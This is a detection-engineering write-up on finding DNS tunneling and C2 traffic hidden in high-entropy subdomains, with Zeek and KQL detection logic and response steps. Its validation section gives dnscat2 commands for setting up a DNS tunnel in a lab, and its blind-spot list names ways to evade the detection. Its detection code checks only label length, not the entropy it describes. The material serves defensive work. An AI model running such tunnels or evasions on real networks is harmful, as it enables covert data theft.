# DNS Tunneling via High-Entropy Subdomains

## Goal

Detect data exfiltration or C2 communication encoded in DNS query subdomains. Adversaries abuse DNS because it is rarely blocked outright and often poorly monitored, making it a reliable covert channel even in restricted environments.

## ATT&CK Categorization

- **Tactic:** TA0011 — Command and Control
- **Technique:** T1071.004 — Application Layer Protocol: DNS
- **Related:** TA0010 — Exfiltration (T1048 — Exfiltration Over Alternative Protocol)

## Strategy Abstract

DNS tunneling tools (iodine, dnscat2, DNSExfiltrator) encode data as subdomains of an attacker-controlled domain. The encoded subdomains are typically long, high-entropy strings that look nothing like legitimate hostnames. This detection looks for DNS queries where the subdomain component exceeds a length threshold and carries high Shannon entropy — a combination that rarely appears in normal DNS traffic but is characteristic of encoded payloads.

Secondary signals: unusually high query volume to a single parent domain, consistent query intervals (C2 beaconing), and query types other than A/AAAA (TXT and CNAME records are commonly abused for tunneling).

## Technical Context

**Data source:** Zeek `dns.log`

**Key fields:**
- `query` — the full DNS query string; subdomain extraction and entropy calculation are applied here
- `qtype_name` — query type; TXT queries to external domains are elevated risk
- `answers` — DNS response; unusually large TXT responses are a corroborating signal
- `id.orig_h` — source host; used to identify the beaconing endpoint

**Environment assumptions:**
- Zeek is deployed at a network chokepoint with visibility into DNS queries (recursive resolver traffic or mirrored upstream)
- A Shannon entropy function is available in the SIEM or applied at log ingestion (e.g., via a Zeek script, Elastic ingest pipeline, or SPL `eval`)
- An internal domain allowlist exists or can be derived from baseline to reduce FP noise on legitimate CDN/cloud subdomains

## Blind Spots

- **Low-and-slow tunneling:** Adversaries who keep query volume below the threshold and spread queries over long windows will evade volume-based components. Entropy detection still applies but is easier to tune around.
- **Encrypted DNS (DoH/DoT):** If clients resolve via DNS-over-HTTPS, Zeek dns.log won't see the queries. Requires separate visibility (proxy logs, EDR DNS telemetry).
- **Legitimate high-entropy domains:** Some CDN and cloud providers (Akamai, AWS, Azure) use long random-looking subdomains. Without a tuned allowlist this generates significant FP volume.
- **FQDN length limits as a bypass:** Adversaries can split payloads into multiple shorter subdomains per query, keeping each component below the length threshold while still exfiltrating data.

## False Positives

| False Positive | Triage Guidance |
|---|---|
| CDN subdomains (Akamai, CloudFront, Fastly) | Check parent domain against CDN provider ranges; add confirmed CDN domains to allowlist |
| Software update checks (Microsoft, Apple, Google) | Cross-reference parent domain against known update infrastructure; volume will be low and consistent across many hosts |
| Security tooling (EDR heartbeats, threat intel feeds) | Identify by source host — should be consistent, low-volume, and limited to known internal tooling hosts |
| GUID-based hostnames in internal infrastructure | Scope by queried domain — if parent domain is internal/owned, suppress |

## Validation

Using [dnscat2](https://github.com/iagox86/dnscat2) in a lab environment:

```bash
# Server side (attacker-controlled resolver)
ruby dnscat2.rb --dns "domain=tunnel.lab.local"

# Client side (victim host in lab)
./dnscat --dns "domain=tunnel.lab.local"
```

Expected result in Zeek `dns.log`: queries to `tunnel.lab.local` with long, high-entropy subdomain labels (e.g., `6162636465666768696a6b6c.tunnel.lab.local`), elevated query rate from a single source IP, mix of query types including TXT.

**KQL (Elastic / Microsoft Sentinel):**
```kql
// Requires entropy field computed at ingestion or via script
dns.question.name: * 
  and dns.question.type: ("TXT" or "NULL" or "CNAME")
  and not dns.question.name: ("*.internal.corp" or "*.windowsupdate.com")
| where strlen(split(dns.question.name, ".")[0]) > 40
```

**Zeek detection script (inline entropy check):**
```zeek
event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
    {
    local labels = split_string(query, /\./);
    if ( |labels| > 2 )
        {
        local subdomain = labels[0];
        if ( |subdomain| > 40 )
            # Emit notice or log for downstream SIEM pickup
            NOTICE([$note=DNS::HighEntropySubdomain,
                    $conn=c,
                    $msg=fmt("Long subdomain in DNS query: %s", query)]);
        }
    }
```

## Response

1. Identify the source host (`id.orig_h`) and isolate if query volume is high or data exfiltration is suspected
2. Enumerate all DNS queries from that host in the same window — look for consistent parent domain and query type pattern
3. Check whether the queried parent domain resolves to an attacker-controlled authoritative nameserver (passive DNS, threat intel lookup)
4. If confirmed tunneling: capture full PCAP for the host if available, escalate to IR, revoke network access
5. If uncertain: flag for analyst review, compare against endpoint telemetry for corroborating process/network activity

## References

- [Palantir ADS Framework](https://github.com/palantir/alerting-and-detection-strategy-framework)
- [MITRE ATT&CK T1071.004](https://attack.mitre.org/techniques/T1071/004/)
- [dnscat2](https://github.com/iagox86/dnscat2)
- [Detecting DNS Tunneling — Cisco Umbrella](https://umbrella.cisco.com/blog/network-attacks-dns-tunneling-detection-prevention)
- [Shannon entropy for DNS anomaly detection — SANS ISC](https://isc.sans.edu/diary/Detecting+DNS+Tunneling/19429)
